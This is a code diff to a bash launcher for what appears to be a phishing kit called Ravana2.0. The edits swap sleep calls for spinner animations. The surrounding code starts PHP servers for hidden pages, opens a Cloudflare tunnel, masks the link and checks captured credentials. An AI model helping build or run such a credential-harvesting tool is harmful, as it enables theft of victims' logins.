@@ -22,9 +22,7 @@ trap user_intrupt SIGTSTP
 # kill the already running proces
 user_intrupt(){
 	printf " \n ${w}\n"
-	printf " ${r}[${w}!${r}]---->>${p} Exiting Ravana2.0"
-	printf " \n"
-	sleep 1
+	gum spin --spinner monkey --title "Exiting ravana " -- sleep 2
 	exit 1
 }
 # make a function to update the ravana if any update is availble 
@@ -100,7 +98,7 @@ start_cloud(){
     # remove the previous log file
     rm -rf .pk.txt > /dev/null 2>&1 
 	ran=$((RANDOM % 10))
-	php -S 127.0.0.1:800$ran -t .pweb/$1 > /dev/null 2>&1 & sleep 2
+	php -S 127.0.0.1:800$ran -t .pweb/$1 > /dev/null 2>&1 & gum spin --spinner dot --title "Starting server" -- sleep 2
     # now ask the url 
     echo -e "\e[0;1m Starting clodflare.. "
     #check fi it is termux or not ..
@@ -121,7 +119,7 @@ start_cloud(){
 	else
 		mask $1 $2 $link
 	fi
-	check_cred $1
+	check_cred $1 
 }
 #make a function to download the cloudflared 
 download(){
@@ -159,7 +157,7 @@ s_localhost(){
 	read lp_optn
 	if [[ $lp_optn -eq 1 ]] || [[ $lp_optn -eq 01 ]];then
 		echo -e "\n"
-		php -S 127.0.0.1:887$ran -t .pweb/$1 > /dev/null 2>&1 & sleep 5 
+		php -S 127.0.0.1:887$ran -t .pweb/$1 > /dev/null 2>&1 & gum spin --spinner dot --title "Starting local server " -- sleep 5 
 		echo -e "\n"
 		echo -e "${r}[${g}+${r}] ${y} Localhost running on http://127.0.0.1:887$ran"
 		#now check for user crenditial------
@@ -167,7 +165,7 @@ s_localhost(){
 	elif [[ $lp_optn -eq 2 ]] || [[ $lp_optn -eq 02 ]];then
 		echo -ne "${p}[${w}-${p}] ${r} Enter a port number: "
 		read p_num #reading for port number
-		php -S 127.0.0.1:$p_num -t .pweb/$1 > /dev/null 2>&1 & sleep 2
+		php -S 127.0.0.1:$p_num -t .pweb/$1 > /dev/null 2>&1 & gum spin --spinner dot --title "Starting local server" -- sleep 2
 		echo -e "\n"
 		echo -e "${r}[${g}+${r}] ${y} Localhost running on http://127.0.0.1:$p_num "
 		check_cred $1
